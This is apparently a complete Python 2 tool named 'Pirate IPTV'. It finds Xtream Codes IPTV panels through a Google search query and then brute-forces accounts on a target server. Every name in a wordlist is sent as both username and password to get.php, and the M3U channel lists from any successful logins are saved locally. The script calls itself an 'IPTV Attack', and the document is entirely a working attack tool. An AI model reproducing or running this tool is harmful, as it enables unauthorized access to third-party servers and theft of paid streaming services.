#!/usr/bin/python
# -*- coding: utf-8 -*-

import urllib2
import google
from urlparse import urlparse
import sys
import os
from sys import argv as s
import time
from tqdm import tqdm
from termcolor import colored

class IPTV(object):
	def __init__(self, stdout=None, stderr=None):
		self._stdout = stdout or sys.stdout
		self._stderr = stderr or sys.stderr
		self.lista = 'names.txt'
		self.query = 'Xtream Codes v1.0.59.5'
		self.directory = "output"
		self.msg = "Pirate IPTV"
		self.parsedUrls = ['']

	def __enter__(self):
		self.old_stdout, self.old_stderr = sys.stdout, sys.stderr
		self.old_stdout.flush(); self.old_stderr.flush()
		sys.stdout, sys.stderr = self._stdout, self._stderr

	def __exit__(self, exc_type, exc_value, traceback):
		self._stdout.flush(); self._stderr.flush()
		sys.stdout = self.old_stdout
		sys.stderr = self.old_stderr

	def print_link(self):
		with IPTV(stdout=devnull, stderr=devnull):
			for url in google.search(self.query, num=60, stop=1):
				parsed = urlparse(url)
				self.parsedUrls.append(parsed.scheme + '://' + parsed.netloc +"\n")
		time.sleep(1)
		print '\n'.join(self.parsedUrls)

	def search_account(self,URL, b=1, bsize=1):
		segale_rosso = colored ('[*]','red')
		segale_verde = colored ('[*]','green')
		print (segale_rosso + ' [CTRL + c] = [IPTV Attack Interrupted]')
		t= tqdm()
		last_b = [0]
		righe = open( self.lista ,'r')
		tsize = len(righe.readlines())
		TT = (str(tsize))		
		t.total = tsize
		tr = 0
		with open(self.lista) as f:
			content = f.readlines()
		for r in content:
			req = urllib2.Request( URL + '/get.php?username=%s&password=%s&type=m3u&output=mpegts'%(r.rstrip().lstrip(),r.rstrip().lstrip()))
			response = urllib2.urlopen(req)
			the_page = response.read()
			# numero tentativi mancanti
			tsize = (tsize - 1)
			t.update((b - last_b[0]) * bsize)
			last_b[0] = b
			TM = (str(tsize))
			#print ('Mancano ' + TM + ' Tentativi su ' + TT)
			time.sleep(0.2)
			if len(the_page) > 0:
				tr = (tr + 1)
				new_path = self.directory + "/" + URL.replace("http://", "")
				msg = (segale_verde + " Account found: ")
				print (msg + str(tr))
				new_path = self.directory + "/" + URL.replace("http://", "")
				if os.path.exists(new_path) is False:
					os.makedirs(new_path)
					out_file = open(str(new_path) + "/tv_channels_%s.m3u" % r.rstrip().lstrip(), "w")
					out_file.write(the_page)
					out_file.close()

	def usage(self):
		print ('##### USAGE #####')
		print ("for print list server " + s[0] + " " + "-pl")
		print ("for search account " + s[0] + " " + "http://site.server")


if __name__ == "__main__":
	try: 
		app = IPTV()
		devnull = open(os.devnull, 'w')
		if len(s) == 1:
			app.usage()
			exit()
		if s[1] == '-h':
			app.usage()
			exit()
		if s[1] == '-pl':
			app.print_link()
			exit()  
		app.search_account(s[1])
	except KeyboardInterrupt:
		segale_giallo = colored ('[*]','yellow')
		print (' ' + segale_giallo + ' IPTV Attack Interrupted')
		sys.exit(0)

